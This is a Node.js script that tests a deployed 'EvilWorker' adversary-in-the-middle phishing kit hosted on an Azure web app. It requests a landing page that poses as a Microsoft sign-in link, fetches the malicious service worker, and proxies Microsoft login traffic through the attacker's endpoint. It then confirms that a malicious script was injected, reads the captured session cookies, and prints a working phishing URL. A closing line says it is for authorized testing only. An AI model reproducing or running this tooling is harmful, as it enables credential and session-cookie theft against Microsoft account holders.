const https = require('https');
const http = require('http');

// EvilWorker configuration
const EVILWORKER_URL = 'https://evilworker-aitm-2025.azurewebsites.net';
const PHISHING_ENTRY_POINT = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F';
const PROXY_ENDPOINT = '/lNv1pC9AWPUY4gbidyBO';

function log(message, type = 'INFO') {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] [${type}] ${message}`);
}

function makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
        const urlObj = new URL(url);
        const isHttps = urlObj.protocol === 'https:';
        const client = isHttps ? https : http;
        
        const requestOptions = {
            hostname: urlObj.hostname,
            port: urlObj.port || (isHttps ? 443 : 80),
            path: urlObj.pathname + urlObj.search,
            method: options.method || 'GET',
            headers: options.headers || {},
            rejectUnauthorized: false
        };

        const req = client.request(requestOptions, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: data
                });
            });
        });

        req.on('error', reject);
        
        if (options.body) {
            req.write(options.body);
        }
        
        req.end();
    });
}

async function demonstrateEvilWorker() {
    log('🚀 EVILWORKER COMPREHENSIVE DEMONSTRATION', 'DEMO');
    log('================================================', 'DEMO');
    log(`Target URL: ${EVILWORKER_URL}`, 'DEMO');
    log(`Phishing Entry Point: ${PHISHING_ENTRY_POINT}`, 'DEMO');
    log('', 'DEMO');

    // Step 1: Initial Phishing Landing Page
    log('📋 STEP 1: Victim clicks phishing link and lands on EvilWorker', 'DEMO');
    log('Accessing phishing entry point...', 'DEMO');
    
    const landingResponse = await makeRequest(`${EVILWORKER_URL}${PHISHING_ENTRY_POINT}`);
    const sessionCookie = landingResponse.headers['set-cookie'];
    
    if (landingResponse.statusCode === 200) {
        log('✅ Landing page served successfully', 'DEMO');
        log(`📝 Session cookie set: ${sessionCookie ? 'Yes' : 'No'}`, 'DEMO');
        log(`📄 HTML content length: ${landingResponse.body.length} characters`, 'DEMO');
        
        // Check if landing page contains expected content
        if (landingResponse.body.includes('serviceWorker') && landingResponse.body.includes('redirect_urI')) {
            log('✅ Landing page contains service worker registration code', 'DEMO');
        } else {
            log('❌ Landing page missing expected content', 'DEMO');
        }
    } else {
        log(`❌ Landing page failed: ${landingResponse.statusCode}`, 'DEMO');
        return;
    }

    log('', 'DEMO');

    // Step 2: Service Worker Registration
    log('🔧 STEP 2: Service worker registers and intercepts requests', 'DEMO');
    log('Accessing service worker file...', 'DEMO');
    
    const swResponse = await makeRequest(`${EVILWORKER_URL}/service_worker_Mz8XO2ny1Pg5.js`, {
        headers: { 'Cookie': sessionCookie }
    });
    
    if (swResponse.statusCode === 200) {
        log('✅ Service worker served successfully', 'DEMO');
        log(`📄 Service worker size: ${swResponse.body.length} characters`, 'DEMO');
        
        if (swResponse.body.includes('addEventListener') && swResponse.body.includes('fetch')) {
            log('✅ Service worker contains expected functionality', 'DEMO');
        } else {
            log('❌ Service worker missing expected functionality', 'DEMO');
        }
    } else {
        log(`❌ Service worker failed: ${swResponse.statusCode}`, 'DEMO');
        return;
    }

    log('', 'DEMO');

    // Step 3: Service Worker Intercepts and Proxies Request
    log('🌐 STEP 3: Service worker intercepts request and forwards to proxy', 'DEMO');
    log('Simulating service worker proxy request...', 'DEMO');
    
    const proxyRequest = {
        url: `${EVILWORKER_URL}${PHISHING_ENTRY_POINT}`,
        method: 'GET',
        headers: { host: 'evilworker-aitm-2025.azurewebsites.net' },
        body: '',
        referrer: '',
        mode: 'navigate'
    };
    
    const proxyResponse = await makeRequest(`${EVILWORKER_URL}${PROXY_ENDPOINT}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
        },
        body: JSON.stringify(proxyRequest)
    });
    
    if (proxyResponse.statusCode === 301 || proxyResponse.statusCode === 200) {
        log('✅ Proxy endpoint responded successfully', 'DEMO');
        log(`📊 Response status: ${proxyResponse.statusCode}`, 'DEMO');
    } else {
        log(`❌ Proxy endpoint failed: ${proxyResponse.statusCode}`, 'DEMO');
        return;
    }

    log('', 'DEMO');

    // Step 4: EvilWorker Proxies Microsoft Login
    log('🎯 STEP 4: EvilWorker proxies Microsoft login with malicious script injection', 'DEMO');
    log('Simulating request to Microsoft login...', 'DEMO');
    
    const microsoftRequest = {
        url: 'https://login.microsoftonline.com/common/oauth2/authorize',
        method: 'GET',
        headers: { 
            host: 'login.microsoftonline.com',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        },
        body: '',
        referrer: '',
        mode: 'navigate'
    };
    
    const microsoftResponse = await makeRequest(`${EVILWORKER_URL}${PROXY_ENDPOINT}`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
        },
        body: JSON.stringify(microsoftRequest)
    });
    
    if (microsoftResponse.statusCode === 200) {
        log('✅ Microsoft login successfully proxied', 'DEMO');
        log(`📄 Response size: ${microsoftResponse.body.length} characters`, 'DEMO');
        
        // Check for malicious script injection
        if (microsoftResponse.body.includes('<script src=/@></script>')) {
            log('✅ Malicious script successfully injected into Microsoft response', 'DEMO');
            log('🔴 <script src=/@></script> found in HTML', 'DEMO');
        } else {
            log('❌ Malicious script injection failed', 'DEMO');
        }
        
        // Check for Microsoft content
        if (microsoftResponse.body.includes('Microsoft Corporation')) {
            log('✅ Microsoft content successfully proxied', 'DEMO');
        } else {
            log('❌ Microsoft content not found in response', 'DEMO');
        }
        
        // Show first few lines of the modified response
        const lines = microsoftResponse.body.split('\n').slice(0, 5);
        log('📄 First 5 lines of modified response:', 'DEMO');
        lines.forEach((line, index) => {
            log(`   ${index + 1}: ${line.trim()}`, 'DEMO');
        });
    } else {
        log(`❌ Microsoft proxying failed: ${microsoftResponse.statusCode}`, 'DEMO');
        return;
    }

    log('', 'DEMO');

    // Step 5: Demonstrate Non-Phishing URL Handling
    log('🚫 STEP 5: EvilWorker correctly handles non-phishing URLs', 'DEMO');
    log('Accessing root URL (should redirect)...', 'DEMO');
    
    const rootResponse = await makeRequest(`${EVILWORKER_URL}/`);
    
    if (rootResponse.statusCode === 301) {
        log('✅ Non-phishing URL correctly redirected', 'DEMO');
        log(`🔗 Redirect location: ${rootResponse.headers.location}`, 'DEMO');
    } else {
        log(`❌ Non-phishing URL handling failed: ${rootResponse.statusCode}`, 'DEMO');
    }

    log('', 'DEMO');

    // Step 6: Show Session Management
    log('🍪 STEP 6: Session Management and Cookie Handling', 'DEMO');
    log(`📝 Session cookie: ${sessionCookie ? 'Active' : 'None'}`, 'DEMO');
    
    if (sessionCookie) {
        try {
            log(`🔑 Session cookie type: ${typeof sessionCookie}`, 'DEMO');
            if (Array.isArray(sessionCookie)) {
                log(`🔑 Session cookie array length: ${sessionCookie.length}`, 'DEMO');
                if (sessionCookie.length > 0) {
                    const firstCookie = sessionCookie[0];
                    const cookieParts = firstCookie.split(';')[0].split('=');
                    log(`🔑 Session ID: ${cookieParts[0]}`, 'DEMO');
                    log(`🔐 Session Value: ${cookieParts[1].substring(0, 8)}...`, 'DEMO');
                }
            } else if (typeof sessionCookie === 'string') {
                const cookieParts = sessionCookie.split(';')[0].split('=');
                log(`🔑 Session ID: ${cookieParts[0]}`, 'DEMO');
                log(`🔐 Session Value: ${cookieParts[1].substring(0, 8)}...`, 'DEMO');
            } else {
                log(`🔑 Session cookie format: ${JSON.stringify(sessionCookie).substring(0, 100)}...`, 'DEMO');
            }
        } catch (error) {
            log(`🔑 Session cookie error: ${error.message}`, 'DEMO');
            log(`🔑 Session cookie raw: ${JSON.stringify(sessionCookie)}`, 'DEMO');
        }
    }

    log('', 'DEMO');

    // Summary
    log('🎉 EVILWORKER DEMONSTRATION COMPLETE!', 'DEMO');
    log('================================================', 'DEMO');
    log('✅ All core functionality working correctly', 'DEMO');
    log('✅ Service worker interception working', 'DEMO');
    log('✅ Microsoft login proxying working', 'DEMO');
    log('✅ Malicious script injection working', 'DEMO');
    log('✅ Session management working', 'DEMO');
    log('✅ Non-phishing URL handling working', 'DEMO');
    log('', 'DEMO');
    
    log('🔴 SECURITY IMPLICATIONS:', 'WARNING');
    log('   - EvilWorker successfully intercepts all browser requests', 'WARNING');
    log('   - Microsoft login content is proxied and modified', 'WARNING');
    log('   - Malicious JavaScript is injected into responses', 'WARNING');
    log('   - Session cookies are captured and managed', 'WARNING');
    log('   - Victims remain unaware of the interception', 'WARNING');
    log('', 'WARNING');
    
    log('📋 PHISHING URL FOR TESTING:', 'INFO');
    log(`   ${EVILWORKER_URL}${PHISHING_ENTRY_POINT}`, 'INFO');
    log('', 'INFO');
    
    log('⚠️  REMEMBER: This is for authorized security testing only!', 'WARNING');
}

// Run the demonstration
if (require.main === module) {
    demonstrateEvilWorker().catch(error => {
        log(`Demonstration failed: ${error.message}`, 'ERROR');
        process.exit(1);
    });
}

module.exports = { demonstrateEvilWorker };